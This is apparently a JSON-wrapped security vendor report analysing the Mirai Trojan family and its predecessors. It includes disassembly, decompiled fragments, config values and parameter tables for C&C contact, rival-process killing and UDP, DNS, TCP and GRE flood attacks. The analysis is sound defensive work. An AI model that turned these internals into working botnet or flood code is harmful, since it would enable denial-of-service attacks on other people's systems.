{
    "id": "8bb7451f-3e1a-40b0-906f-fb8ccfb2feea",
    "created_at": "2022-10-25T16:48:15.949667Z",
    "updated_at": "2025-03-27T02:16:59.231464Z",
    "deleted_at": null,
    "sha1_hash": "60a662ddec30c427e34154cf534ddcfba19db921",
    "title": "Investigation of Linux.Mirai Trojan family",
    "authors": "",
    "file_creation_date": "2016-09-30T13:50:21Z",
    "file_modification_date": "2016-09-30T13:50:21Z",
    "file_size": 992677,
    "plain_text": "# Investigation of Linux.Mirai Trojan family\n\n\n-----\n\n#### © Doctor Web, 2016. All rights reserved.\n\nThis document is the property of Doctor Web. No part of this document may be reproduced, published or\ntransmitted in any form or by any means for any purpose other than the purchaser's personal use without\nproper attribution.\n\nDoctor Web develops and distributes Dr.Web information security solutions which provide efficient\nprotection from malicious software and spam.\n\nDoctor Web customers can be found among home users from all over the world and in government\nenterprises, small companies and nationwide corporations.\n\nDr.Web antivirus solutions are well known since 1992 for continuing excellence in malware detection and\ncompliance with international information security standards. State certificates and awards received by the\nDr.Web solutions, as well as the globally widespread use of our products are the best evidence of\nexceptional trust to the company products.\n\n**Investigation of Linux.Mirai Trojan family**\n**9/30/2016**\n\nDoctor Web Head Office\n2-12A, 3rd str. Yamskogo polya\nMoscow, Russia\n125124\n\nWebsite: www.drweb.com\nPhone: +7 (495) 789-45-87\n\nRefer to the official web site for regional and international office information.\n\n\n-----\n\n## Introduction\n\nA Trojan for Linux that was named Linux.Mirai has several predecessors. The first malware program belonging to this family was spotted in May 2016 and was dubbed **Linux.DDoS.87. At the beginning of**\nAugust, a new version of this Trojan—Linux.DDoS.89—was discovered. Finally, Doctor Web’s security\nresearchers investigated the Linux.Mirai Trojan found later that month.\n\nTo learn more on each Trojan, click the corresponding link below:\n\nDescription of Linux.DDoS.87\n\nDescription of Linux.DDoS.89\n\nDescription of Linux.Mirai\n\n\n-----\n\n## Linux.DDoS.87\n\n\nc129e2a23abe826f808725a0724f12470502a3cc—x86\n\n8fd0d16edf270c453c5b6b2481d0a044a410c7cd—ARM\n\n9ff383309ad63da2caa9580d7d85abeece9b13a0—ARM\n\nA Trojan for Linux designed to carry out DDoS attacks. All versions of this malicious program use the\n```\nuClibc.so library. Before starting the mode of receiving and executing commands, the Trojan calls the\n\n```\nfollowing functions:\n```\n .text:0804B378         push  1000h      ; size\n .text:0804B37D         call  _malloc\n .text:0804B382         mov   edi, eax    ; buffer for com mand\n .text:0804B384         call  fillConfig\n .text:0804B389         call  init_random\n .text:0804B38E         call  runKiller\n .text:0804B393         call  fillCmdHandlers\n\n#### fillConfig\n\n```\nThis function uses one memory sector to store configuration information. This configuration storing can\nbe described in the C language as follows:\n```\n union {\n  char *;\n  short *;\n  int *;\n } conf_data;\n struct conf_entry {\n   uint32  number;\n   conf_data data;\n   uint32  length\n }\n struct malware_config {\n   conf_entry *entries;\n   uint32   entries_count;\n }\n\n```\nEach configuration field is filled in the following way:\n\n\n-----\n\nSome strings are stored in an encrypted ELF file and are decrypted before being recorded:\n\n\n-----\n\nThe following data is saved to the examined sample’s configuration:\n\n|Num- ber|Data type|Value|Purpose|\n|---|---|---|---|\n|0|uint32|—|Command and control server’s IP ad- dress|\n|1|uint 16|—|port|\n|2|string|'kami\\x00'|displayed in main on stdin upon launch- ing the Trojan|\n|3|uint 8|1|Sent to the server after transferring the MAC address|\n|4|4|0x08080808|not used|\n|5|4|JR**|not used|\n|6|4|0x06400640|not used|\n|7|4|0x0300f4d1|not used|\n|8|string|\"TSource Engine Query\"|cmd1 – TSource Engine DDoS|\n|9|string|\"/\"|cmd14 default page|\n|10|string|\"www.google.com\"|cmd14 default host|\n|11|string|\"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0\"|cmd14 User Agent for request|\n|12|string|\"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36\"|cmd14 User Agent for request|\n|13|string|\"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36\"|cmd14 User Agent for request|\n|14|string|\"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36\"|cmd14 User Agent for request|\n|15|string|\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56\"|not used|\n|20|string|\"GET \"|cmd14 generating requests|\n|21|string|\"HTTP/1.1\"|cmd14 generating requests|\n|22|string|\"Host: \"|cmd14 generating requests|\n\n\n-----\n\n|Num- ber|Data type|Value|Purpose|\n|---|---|---|---|\n|23|string|\"Connection: keep-alive\"|cmd14 generating requests|\n|24|string|\"User-Agent: \"|cmd14 generating requests|\n|25|string|\"Accept: text/html,application/xhtml +xml,application/xml;q=0.9,image/webp,*/ *;q=0.8\"|cmd14 generating requests|\n|26|string|\"Accept-Encoding: gzip, deflate, sdch\"|cmd14 generating requests|\n|27|string|\"Accept-Language: en-US,en;q=0.8\"|cmd14 generating requests|\n|28|string|\"Cookie: \"|not used|\n|29|string|\"/proc/\"|used by runKiller function|\n|30|string|\"/exe\"|used by runKiller function|\n|31|string|\"/cwd/\"|used by runKiller function|\n|33|string|\".shinigami\"|used by runKiller and main functions|\n|100|string|\"gayfgt\"|used by runKiller function|\n|101|string|\"REPORT %s:%s\"|used by runKiller function|\n|102|string|\"hello friend :)\"|used by runKiller function|\n|103|string|\"[KTN]\"|used by runKiller function|\n\n\nThe following functions are then used to get the configuration values:\n\n|Function|Purpose|\n|---|---|\n|char *get_data_from_config(int num- ber)|returns the data pointer for conf_entry with the number value|\n|uint32 get_conf_uint32(int number)|returns unit32 stored under the data pointer for conf_entry with the number value|\n|uint16 get_conf_uint16(int number)|returns unit16 stored under the data pointer for conf_entry with the number value|\n|uint8 get_conf_uint8(int number)|returns unit8 stored under the data pointer for conf_entry with the number value|\n\n\n-----\n\n#### init_random\n\nThis function initializes the generation of pseudo-random sequences. **Linux.BackDoor.Fgt and**\n**Linux.BackDoor.Tsunami used such generators; however, their operation was implemented in a differ-**\nent manner.\n\nThe init_rand function from Linux.DDoS.87:\n\n\n-----\n\nThe init_random function from Linux.DDoS.87:\n\n\n-----\n\n#### runKiller\n\nThis function launches a child process designed to search running processes for other Trojans and terminate them. You can see a description of a child process’s operation below.\n\nFirst, the process kills standard stdin, stdout, and stderr threads and retrieves the strings it needs from\nthe configuration:\n\n\n-----\n\nThen the Trojan tries to open the following file objects:\n```\n /proc/<PID>/exe\n /proc/<PID>/cwd/\n\n```\nIf successful, the relevant flag is set. If not, the process terminates itself:\n```\n .text:0804B13F         cmp   ds:couldOpenExe, 0\n .text:0804B146         jz   short loc_804B158\n .text:0804B148         lea   ebp, [esp+0A3Ch+var_226]\n .text:0804B14F         cmp   ds:couldOpenCWD, 0\n .text:0804B156         jnz   short loc_804B17E\n .text:0804B158\n .text:0804B158 loc_804B158:              ; CODE XREF: run Killer+1C6j\n .text:0804B158         sub   esp, 0Ch\n .text:0804B15B         push  0        ; status\n .text:0804B15D         call  ___GI_exit\n\n```\nIf the process continues operating, in five minutes it starts searching for other Trojans in order to terminate their operation by reading the content of the /proc/ folder in an infinite loop:\n\n\n-----\n\nIf the folder from which the process was run is found to contain a file named .shinigami, the process is\nnot terminated because it is used to implement some kind self-protection:\n\n\n-----\n\nIf the file named .shinigami is absent from the folder, the process’s executable file is read in order to\nfind strings from a configuration whose numbers are higher than 100. Meanwhile, the Trojan reads file\nfragments sequentially. The size of each fragment is 0x800 byte. If the value required is at buffer overflow, the process is not terminated.\n\n#### fillCmdHandlers\n\nA function responsible for filling a structure that stores command handlers. The structure looks as follows:\n```\n struct cmd {\n   char number;\n   void *handler;\n }\n struct cmd_handlers {\n   cmd *handlers;\n   char length;\n }\n\n```\nThe structure is filled in the following way:\n\n\n-----\n\nAs a result, the following command table is generated:\n\n**Number** **Purpose**\n\n15-17 The examined sample contains functions that are executed in an infinite loop\n\n14 HTTP flood\n\n9 Transparent Ethernet Bridging в GRE\n\n8 UDP flood overGRE\n\n7 Establishing a TCP connection\n\n6 sending a TCP packet\n\n4 TCP flood—send packets containing random data\n\n3 TCP flood—send packets with TCP options\n\n2 DNS flood\n\n1 TSource flood\n\n0 UDP flood\n\nOnce all the above functions are performed, the following string is retrieved from the configuration and\nadded to the stdin thread:\n\n|Number|Purpose|\n|---|---|\n|15-17|The examined sample contains functions that are executed in an infinite loop|\n|14|HTTP flood|\n|9|Transparent Ethernet Bridging в GRE|\n|8|UDP flood overGRE|\n|7|Establishing a TCP connection|\n|6|sending a TCP packet|\n|4|TCP flood—send packets containing random data|\n|3|TCP flood—send packets with TCP options|\n|2|DNS flood|\n|1|TSource flood|\n|0|UDP flood|\n\n\n-----\n\nThen the Trojan removes its name to hide itself:\n```\n .text:0804B3D8         mov   ebp, [esi]   ; esi = argv[0]\n .text:0804B3DA         push  ebp       ; a1\n .text:0804B3DB         call  strlen\n .text:0804B3E0         add   esp, 10h\n .text:0804B3E3         mov   ecx, eax\n .text:0804B3E5         test  eax, eax\n .text:0804B3E7         jle   short loc_804B3F6\n .text:0804B3E9         xor   edx, edx\n .text:0804B3EB\n .text:0804B3EB loc_804B3EB:              ; CODE XREF: main\n +94j\n .text:0804B3EB         mov   eax, [esi]\n .text:0804B3ED         mov   byte ptr [eax+edx], 0\n .text:0804B3F1         inc   edx\n .text:0804B3F2         cmp   ecx, edx\n .text:0804B3F4         jnz   short loc_804B3EB\n\n```\nThe child processes are subsequently launched (the code is simplified and contains no requests to the\nconfiguration):\n\n\n-----\n\nThe .shinigami file is created in the Trojan’s folder to protect the Trojan from removing itself. The maximum uptime of Linux.DDoS.87 on an infected computer is one week, after which the Trojan terminates\nits operation.\n\n### The cycle for receiving and executing commands\n\nAfter that, the malicious process tries to connect to the C&C server to get instructions:\n\n\n-----\n\nIf recv returns an error, a socket is opened, and its content is recorded to the fd global variable:\n```\n .text:0804B553 recv_failed:              ; CODE XREF: main\n +159j\n .text:0804B553         mov   eax, ds:fd\n .text:0804B558         test  eax, eax\n .text:0804B55A         js   short fd_closed_or_uninitialized\n .text:0804B55C         sub   esp, 0Ch\n .text:0804B55F         push  eax       ; fd\n .text:0804B560         call  ___libc_close\n .text:0804B565         add   esp, 10h\n .text:0804B568\n .text:0804B568 fd_closed_or_uninitialized:       ; CODE XREF: main\n +1FAj\n .text:0804B568         push  eax\n .text:0804B569         push  0\n .text:0804B56B         push  1\n .text:0804B56D         push  2\n .text:0804B56F         call  ___GI_socket\n .text:0804B574         add   esp, 10h\n .text:0804B577         mov   ds:fd, eax\n\n```\nDuring reading/writing, a minute-long time-out is set:\n\n\n-----\n\nThen a connection to the C&C server is established:\n```\n .text:0804B5CE         mov   [esp+4ACh+cnc_sockaddr.sin_fam ily], 2\n .text:0804B5D8         add   esp, 14h\n .text:0804B5DB         push  0\n .text:0804B5DD         call  get_conf_uint32\n .text:0804B5E2         mov   dword ptr [esp+0], 1\n .text:0804B5E9         mov   [esp+49Ch+cnc_sock addr.sin_addr.s_addr], eax\n .text:0804B5F0         call  get_conf_uint16\n .text:0804B5F5         ror   ax, 8\n .text:0804B5F9         mov   [esp+49Ch+cnc_sockaddr.sin_port],\n ax\n .text:0804B601         add   esp, 0Ch\n .text:0804B604         mov   eax, ds:fd\n .text:0804B609         push  10h\n .text:0804B60B         lea   edx, [esp+494h+cnc_sockaddr]\n .text:0804B612         push  edx\n .text:0804B613         push  eax\n .text:0804B614         call  ___libc_connect\n\n```\nAfter that the IP address of the interface in use is saved and a string containing an identifier of an infected device’s architecture (х86, ARM, MIPS, SPARC, SH-4 or M68K) is sent to the C&C server:\n\n\n-----\n\nThe MAC address of a network card is also sent to the C&C server:\n\n\n-----\n\nData from the C&C server is saved to the buffer. If more than one command is received during an iteration, they are handled one by one. The format of the received command (for number fields, network\nbyte order is used) is as follows:\n\n**Field** **Purpose** **Size**\n\nfullLength full length of the received com- 2\nmand\n\nsleepTime time for execution (every command 4\nruns a new process using fork and\nthen kills it)\n\ncmd command number 1\n\nhostCount number of attacked hosts 1\n\ntarget[hostCount] target array 5*hostCount\n\nparam_cnt quantity 1\n\nparam[param_cnt] parameters ...\n\nIf fullLength == 0, two zero bytes are sent to the C&C server:\n\n|Field|Purpose|Size|\n|---|---|---|\n|fullLength|full length of the received com- mand|2|\n|sleepTime|time for execution (every command runs a new process using fork and then kills it)|4|\n|cmd|command number|1|\n|hostCount|number of attacked hosts|1|\n|target[hostCount]|target array|5*hostCount|\n|param_cnt|quantity|1|\n|param[param_cnt]|parameters|...|\n\n\n-----\n\nIf the length is zero, the processor of the received command is launched:\n\n\n-----\n\n#### process\n\nThe function receives a pointer to the third byte of the command and its length. Then it starts parsing\nthe command’s arguments and filling the respective structures:\n\n\n-----\n\nCode to initiate an analysis of the packet header:\n\n\n-----\n\nParsing code for received targets:\n```\n .text:0804BAC7 parse_next_target:           ; CODE XREF: pro cess+A3j\n .text:0804BAC7         mov   edx, [ecx+pkct_cmd.target.ip_addr]\n .text:0804BACA         mov   [esi+target_parsed.target_ip], edx\n .text:0804BACC         mov   al, [ecx+pkct_cmd.target.masksize]\n .text:0804BACF         add   ecx, 5\n .text:0804BAD2         mov   [esi+target_parsed.masksize], al\n .text:0804BAD5         mov   [esi+target_parsed.sockaddr.sin_ family], 2\n .text:0804BADB         mov   [esi+target_parsed.sock addr.sin_addr.s_addr], edx\n .text:0804BADE         add   esi, 18h\n .text:0804BAE1         cmp   ecx, ebp\n .text:0804BAE3         jnz   short parse_next_target\n .text:0804BAE5         mov   edx, [esp+4Ch+target_count]\n .text:0804BAE9         add   ecx, 6\n .text:0804BAEC         mov   [esp+4Ch+var_18], ecx\n .text:0804BAF0         lea   eax, [edx+edx*4]\n .text:0804BAF3         sub   ebx, eax\n .text:0804BAF5         sub   ebx, 6\n .text:0804BAF8         mov   [esp+4Ch+unprocessed_bytes], ebx\n\n```\nThen the Trojan determines whether the transmitted parameters need to be parsed. If they do, the run```\n_command function is called after the parsing is complete:\n\n```\n\n-----\n\n#### run_command\n\nThe function receives a time value, a command number, a quantity and array of targets, and a quantity\nand array of parameters. First, the handler needed is searched for:\n\n\n-----\n\nThen child processes are run:\n\n\n-----\n\n#### Command handlers\n\n\n-----\n\nOther handlers act as follows:\n```\n void handle(target *t, param *p){\n   the Trojan receives packet parameters\n   a packet is created for every target\n   yet 1 {\n     for every target\n       packet is being sent\n   }\n }\n\n#### cmd0 – UDP Flood\n\n```\nFirst, the parameters received are parsed:\n\n\n-----\n\nThe getNumberOrDefault function has the following structure:\n```\n int __cdecl getNumberOrDefault(unsigned __int8 length, param2 *param,\n char id, int default)\n\n```\nIt returns the value from the parameter array with the specified id or the value default if the id is not\nfound. Values for the id field:\n\n|Id|Value|\n|---|---|\n|0|It is changed depending on the handler and implies either the length of the whole packet or the length of the data.|\n|1|For some types of attacks, it determines whether random data needs to be generated in the packet.|\n|2|ip_header.TOS|\n|3|ip_header.identification|\n|4|ip_header.TTL|\n|5|ip_header.flags << 13 | ip_header.fragment|\n|6|Source port|\n|7|Dest port|\n|8|Host in the DNS request|\n|9|DNS request parameters|\n|11|TCP.urgent_flag|\n|12|TCP.ack_flag|\n|13|TCP.psh_flag|\n|14|TCP.rst_flag|\n|15|TCP.syn_flag|\n|16|TCP.fin_flag|\n|17|TCP.Sequence_number|\n|19|Specifies whether ip.dstAddr in the GRE packet is the same as in the external packet.|\n|20|Requested page|\n|22|The host header value|\n\n\n-----\n\nThen the Trojan creates a “raw” socket and enters the IP header:\n```\n .text:0804AB7F         push  IPPROTO_UDP\n .text:0804AB81         push  SOCK_RAW\n .text:0804AB83         push  AF_INET\n .text:0804AB85         call  ___GI_socket\n .text:0804AB8A         mov   [esp+6Ch+fd], eax\n .text:0804AB8E         add   esp, 10h\n .text:0804AB91         inc   eax\n .text:0804AB92         jz   loc_804AE5E\n .text:0804AB98         mov   [esp+5Ch+var_14], 1\n .text:0804ABA0         sub   esp, 0Ch\n .text:0804ABA3         push  4\n .text:0804ABA5         lea   eax, [esp+6Ch+var_14]\n .text:0804ABA9         push  eax\n .text:0804ABAA         push  IP_HDRINCL\n .text:0804ABAC         push  SOL_IP\n .text:0804ABAE         mov   ebx, [esp+78h+fd]\n .text:0804ABB2         push  ebx\n .text:0804ABB3         call  ___GI_setsockopt\n\n```\nAfter that, it is generated using the header of a IP/UDP datagram for each objective received:\n\n\n-----\n\nThen packets are sent to specified targets. If maskbits <= 31, a random target is generated. If the parameter values ident, dport, and sport equal 0xffff, these parameters are generated randomly for\nevery packet. If a certain parameter is set, a packet’s body will be generated:\n\n\n-----\n\nThen the Trojan counts checksums and shifts its attention to the next target. This procedure continues\nuntil the process is terminated:\n\n\n-----\n\n#### cmd1 – Source Engine Amplification\n\nIt operates like the previous command; however, the packet’s content is retrieved from the configuration:\n\n\n-----\n\n#### cmd2 – DNS flood\n\nThis command uses parameters similar to the previous ones; however, in this case, the value transac```\ntion_id and the domain name that needs to be requested are added for the DNS packet:\n TOS = getNumberOrDefault(params_count, params, 2, 0);\n ident = getNumberOrDefault(params_count, params, 3, 0xFFFF);\n TTL = getNumberOrDefault(params_count, params, 4, 64);\n frag = getNumberOrDefault(params_count, params, 5, 0);\n sport = getNumberOrDefault(params_count, params, 6, 0xFFFF);\n dport = getNumberOrDefault(params_count, params, 7, 53);\n transaction_id_1 = getNumberOrDefault(params_count, params, 9, 0xFFFF);\n random_data_length = getNumberOrDefault(params_count, params, 0, 12);\n query = getString(params_count, params, 8, 0);\n\n```\nA packet containing 100 domain requests is generated and sent to the specified address. The Recursion\n**desired flag is set:**\n\n\n-----\n\nA name of a requested host is generated by setting a length of a generated prefix in the field 0, to which\na string, transmitted in the parameter with id = 8, is added.\n\n#### cmd3 – TCP flood 2 options\n\nThe command is responsible for sending TCP packets to specified targets. It also allows values to be specified for TCP flags using these parameters:\n\n\n-----\n\nSetting flags in the packet:\n\n\n-----\n\nIn addition, TCP parameters with numbers 2 and 8 are installed into the packet—maximum segment\n```\nsize and timestamp:\n .text:0804A05D         mov   byte ptr [ebx+28h], TCPOPT_MAXSEG\n .text:0804A061         mov   byte ptr [ebx+29h], 4\n .text:0804A065         call  rand_cmwc\n .text:0804A06A         mov   byte ptr [ebx+2Ch], 4\n .text:0804A06E         and   eax, 0Fh\n .text:0804A071         mov   byte ptr [ebx+2Dh], 2\n .text:0804A075         add   eax, 578h\n .text:0804A07A         mov   byte ptr [ebx+2Eh],\n TCPOPT_TIMESTAMP\n .text:0804A07E         ror   ax, 8\n .text:0804A082         mov   byte ptr [ebx+2Fh], 0Ah\n .text:0804A086         mov   [ebx+2Ah], ax\n .text:0804A08A         call  rand_cmwc\n .text:0804A08F         mov   dword ptr [ebx+34h], 0\n .text:0804A096         mov   [ebx+30h], eax\n .text:0804A099         mov   byte ptr [ebx+38h], 1\n .text:0804A09D         mov   byte ptr [ebx+39h], 3\n .text:0804A0A1         mov   byte ptr [ebx+3Ah], 3\n .text:0804A0A5         mov   byte ptr [ebx+3Bh], 6\n\n```\nOnce generated, the packet is sent without any information.\n\n#### cmd4 – TCP flood random\n\nThis command operates like the previous one; however, the TCP parameters are not set in the packet. If\nthe corresponding flag is set, random data is written to the packet.\n\n#### cmd6 – TCP flood 1 option\n\nThe command is similar to cmd3; however, only one parameter is set:\n\n\n-----\n\n#### cmd7 – TCP flood simple\n\nIn contrast to the previous methods, when this command is executed, only the port and the size of the\ntransmitted data are defined. To carry out an attack, sockets are used to establish a TCP connection:\n```\n port = getNumberOrDefault(params_count, params, 7, 80);\n size = getNumberOrDefault(params_count, params, 0, 1024);\n useRandom = getNumberOrDefault(params_count, params, 1, 1);\n\n#### cmd8 UDP flood over GRE\n\n```\nThe command sends UDP packets over the GRE protocol and uses the following parameters:\n```\n TOS = getNumberOrDefault(params_count, param, 2, 0);\n ident = getNumberOrDefault(params_count, param, 3, 0xFFFF);\n TTL = getNumberOrDefault(params_count, param, 4, 64);\n frag = getNumberOrDefault(params_count, param, 5, 1);\n sport = getNumberOrDefault(params_count, param, 6, 0xFFFF);\n dport = getNumberOrDefault(params_count, param, 7, 0xFFFF);\n payloadLength = getNumberOrDefault(params_count, param, 0, 512);\n fillRandom = getNumberOrDefault(params_count, param, 1, 1);\n useSameAddr = getNumberOrDefault(params_count, param, 19, 0); //inner\n ip.dstAddr == outer ip.dstAddr\n\n```\nThe GRE packet is generated as follows:\n\n\n-----\n\n-----\n\n#### cmd10 GRE Packet using Transparent Ethernet Bridging\n\nLike the previous command, this command sends encapsulated GRE packets; however, TEB (Transparent\nEthernet Bridging) is used: the packet contains a full-featured Ethernet frame. The sender’s and the receiver's MAC addresses are randomly generated in the internal frame:\n```\n .text:08048A3A         mov   [ebx+ipgre_9.outer_iphdr._ip.pro tocol], IPPROTO_GRE\n .text:08048A3E         mov   [ecx+gre_packet.protocolType],\n 5865h ; GRE_NET_TEB\n .text:08048A44         mov   eax, ds:selfaddr\n .text:08048A49         mov   edx, [esp+6Ch+arg_4]\n .text:08048A4D         mov   [ebx+ipgre_9.outer_iphdr._ip.sr c_addr], eax\n .text:08048A50         mov   ecx, [esp+6Ch+saved_frame]\n .text:08048A54         mov   eax, [esp+6Ch+counter]\n .text:08048A58         mov   [ecx+ether_packet.type], 8 ; IP\n\n#### cmd14 HTTP Flood\n\n```\nDuring one iteration, the command sends 10 HTTP requests that look as follows:\n\n\n-----\n\n## Linux.DDoS.89\n\n\nSHA1: 846b2d1b091704bb5a90a1752cafe5545588caa6\n\nA modified version of Linux.DDoS.87 that fills structures with command handlers in a similar way:\n```\n v0->number_ = 0;\n v0->func = cmd0;\n v2 = (cmd **)realloc(malware_conf.entries, 4 * malware_conf.size + 4);\n v3 = malware_conf.size + 1;\n malware_conf.entries = v2;\n v2[malware_conf.size] = v1;\n malware_conf.size = v3;\n v4 = (cmd *)calloc(1u, 8u);\n v5 = v4;\n v4->number_ = 1;\n v4->func = cmd1;\n\n```\nThe appearance of some structures has been changed: some fields have been swapped around. The way\nthe configuration is filled and stored has also been changed: in this version, the memory is not reallocated; instead, a statically allocated memory area is used to save the Trojan. Before using a specific configuration value that is stored in the memory, the decode function is called. This function decrypts the\nvalue by implementing an XOR operation and is then called again to encrypt the value in the memory.\nLike in the previous version, field values are obtained from a number, but now it coincides with the location in the array. The command format has not been changed. The method of running a command handler is still the same (taking into account that the way of storing handlers has been changed).\n\nRunning the command handler in Linux.DDoS.87:\n\n\n-----\n\n-----\n\nRunning the command handler in Linux.DDoS.89:\n\n\n-----\n\n### The main differences from Linux.DDoS.87\n\nThe pseudo-random sequence generator has been changed, as has the order in which the Trojan performs its actions once it has been launched. First, it starts operating with signals, ignoring SIGINT:\n```\n __GI_sigemptyset(&v43);\n __GI_sigaddset(&v43, SIGINT);\n __GI_sigprocmask(SIG_BLOCK, &v43, 0)\n\n```\nThen other signal handlers are installed:\n\n\n-----\n\nThe process then receives the IP address of the network interface used to connect to the Internet via the\nGoogle DNS server (Linux.DDoS.87 got this address by connecting to its C&C server):\n```\n int getMyIp()\n {\n  int v0; // esi@1\n  int result; // eax@1\n  __int16 v2; // [esp+20h] [ebp-1Ch]@2\n  __int16 v3; // [esp+22h] [ebp-1Ah]@2\n  int v4; // [esp+24h] [ebp-18h]@2\n  int v5; // [esp+30h] [ebp-Ch]@1\n  v5 = 16;\n  v0 = __GI_socket(2, 2, 0);\n  result = 0;\n  if ( v0 != -1 )\n  {\n   v2 = 2;\n   v4 = 0x8080808;\n   v3 = 0x3500;\n   __libc_connect(v0, &v2, 16);\n   __GI_getsockname(v0, &v2, &v5);\n   __libc_close(v0);\n   result = v4;\n  }\n  return result;}\n\n```\nThe local server is then launched:\n\n\n-----\n\n-----\n\nIf the Trojan fails to use the **bind system call, it connects to the corresponding port because it is as-**\nsumed that the port is already busy running a previously launched Linux.DDoS.89 process. In this case,\nthe previously launched process terminates itself. Once the server is launched, the C&C server address\ninformation stored in the executable file is added to the sockaddr_in structure:\n```\n .text:0804BBEF         mov   ds:cnc.sin_family, 2\n .text:0804BBF8         add   esp, 10h\n .text:0804BBFB         mov   ds:cnc.sin_addr.s_addr, XXXXXXXXh\n .text:0804BC05         mov   ds:cnc.sin_port, 5000h\n\n```\nThen the following function obtained from the process is calculated:\n```\n def check(name):\n   print name\n   a = [ord(x) for x in name]\n   sum = (0 - 0x51) & 0xff\n   for i in [2,4,6,8,10,12]:\n     z = (~a[i % len(a)] & 0xff)\n     sum = (sum + z)&0xff\n   return sum % 9\n\n```\nThe result returned by the function is an index in a function array. The function with the corresponding\nindex will be performed. The list of functions looks as follows:\n\n\n-----\n\nThen the name of the current process is checked. If it is “./dvrHelper”, the SIGTRAP signal is created.\nThis signal is responsible for changing the C&C server.\n\nEach configuration is filled in the following way:\n```\n v2 = (char *)malloc(0xFu);\n memcpy(v2, (char *)&unk_8051259, 15);\n conf_entries[3].data = v2;\n conf_entries[3].length = 15;\n v3 = (char *)malloc(4u);\n memcpy(v3, \"'ь+B\", 4);\n conf_entries[4].data = v3;\n conf_entries[4].length = 4;\n v4 = (char *)malloc(2u);\n memcpy(v4, \"\\\"5\", 2);\n conf_entries[5].data = v4;\n conf_entries[5].length = 2;\n v5 = (char *)malloc(7u);\n\n```\nThe configuration for this sample looks as follows:\n\n|Num- ber|Decrypted value|Purpose|\n|---|---|---|\n|1|\"DROPOUTJEEP\"||\n|2|\"wiretap -report='tcp://65.222.202.53:80'\"|this string is appended as a Trojan’s name and is dis- played in a process list|\n|3|\"listening tun0\"|output to stdin when launched|\n|4|<ip-addres>|C&C server’s address|\n|5|<port>|C&C server’s port|\n|6|\"/proc/\"|runkiller|\n|7|\"/exe\"|runkiller|\n|8|\"REPORT %s:%s\"|runkiller|\n|9|\"HTTPFLOOD\"|runkiller|\n\n\n-----\n\n|Num- ber|Decrypted value|Purpose|\n|---|---|---|\n|10|\"LOLNOGTFO\"|runkiller|\n|11|\"\\x58\\x4D\\x4E\\x4E\\x43\\x50\\x46\\x22\"|runkiller|\n|12|\"zollard\"|runkiller|\n|13|\"GETLOCALIP\"|unused|\n|14|<host>|the scanner of the hosts’ IP address to which informa- tion on infected computers is sent|\n|15|<port>|the scanner of the hosts’ port to which information on infected computers is sent|\n|16|\"shell\"|scanner|\n|17|\"enable\"|scanner|\n|18|\"sh\"|scanner|\n|19|\"/bin/busybox MIRAI\"|scanner|\n|20|\"MIRAI: applet not found\"|scanner|\n|21|\"ncorrect\"|scanner|\n|22|\"TSource Engine Query\"|cmd1|\n|23|\"/etc/resolv.conf\"|cmd2|\n|24|\"nameserver\"|cmd2|\n\n\nOnce the configuration is filled, the process’s name is changed to conf[2]. Using the prctl function, its\nname is changed to conf[1].\n\nThen conf[3] is output to the standard stdin thread:\n\n\n-----\n\nChild processes are subsequently created and the following functions are called:\n```\n .text:0804BEBF         call  init_consts__\n .text:0804BEC4         call  fill_handlers\n .text:0804BEC9         call  run_scanner\n .text:0804BECE         pop   esi\n .text:0804BECF         mov   edx, [esp+1228h+var_1210]\n .text:0804BED3         mov   ebx, [edx]\n .text:0804BED5         push  ebx\n .text:0804BED6         call  runkiller\n\n```\nThe runkiller function does not check whether files are present in the process’s directory because it uses\nPID. The process will not be terminated if its PID is the same as the current or parental one.\n\nThe same changes were implemented to the network operation mechanism. Instead of blocking sockets,\nthe Trojan uses the select system call which also handles server sockets. When connecting to a server\nsocket, all child processes and the current process are terminated, and a new scanner process is run:\n\n\n-----\n\nThe MAC address of the network adapter is not sent to the C&C server, and network commands are received one by one.\n\nThe run_scanner function, which was borrowed from the Linux.BackDoor.Fgt Trojan family and which is\nresponsible for searching for vulnerable devices, has been slightly changed—the C&C server’s address,\nto which information on infected computers is sent, is extracted from the configuration.\n\nHTTP flood is now missing from the list of types of attacks performed, and commands have been reordered:\n\n**Number** **Type**\n\n0 UPD random\n\n1 TSource\n\n2 DNS flood\n\n3 TCP flood 2 options\n\n4 TCP flood random data\n\n5 TCP flood\n\n6 UDP over GRE\n\n7 TEB over GRE\n\nIn the examined sample, virus makers tried to carry out a DNS amplification attack: the DNS server’s address is retrieved either from the resolv.conf file or from a list of public DNS servers hard-coded into the\nTrojan’s body.\n\n|Number|Type|\n|---|---|\n|0|UPD random|\n|1|TSource|\n|2|DNS flood|\n|3|TCP flood 2 options|\n|4|TCP flood random data|\n|5|TCP flood|\n|6|UDP over GRE|\n|7|TEB over GRE|\n\n\n-----\n\n## Linux.Mirai\n\n\nSHA1: 7e0e07d19b9c57149e72a7ed266e0c8aa5019a6f\n\nA modified version of Linux.DDoS.87 and Linux.DDoS.89. Its main differences from **Linux.DDoS.89 are**\nas follows:\n\n- Some samples of the Trojan can now delete themselves.\n\n- The Trojan can disable the watchdog timer, which prevents system hangs, to make it impossible to reboot the computer.\n\n- The process’s name is changed to a random sequence containing the characters [a-z 0-9].\n\n- The configuration structure has been changed.\n\n- If a process named “.anime” is found, the **Runkiller function not only terminates this process but**\nalso deletes the executable file.\n\n- Unlike Linux.DDoS.89, this version can execute HTTP Flood attacks.\n\n- If the Trojan fails to create a socket and connect to it, the corresponding function searches for the\nprocess that owns the socket and kills it.\n\nThe Trojan’s configuration looks as follows:\n\n|Number|Value|Purpose|\n|---|---|---|\n|3|Listening tun0|Main output to stdin|\n|4|Host|Command and control server’s IP address|\n|5|Port|C&C server’s port|\n|6|\"https://youtube.com/watch? v=dQw4w9WgXcQ\"||\n|7|\"/proc/\"|runkiller|\n|8|\"/exe\"|runkiller|\n|9|\" (deleted)\"||\n|10|\"/fd\"|runkiller|\n|11|\".anime\"|runkiller|\n|12|\"REPORT 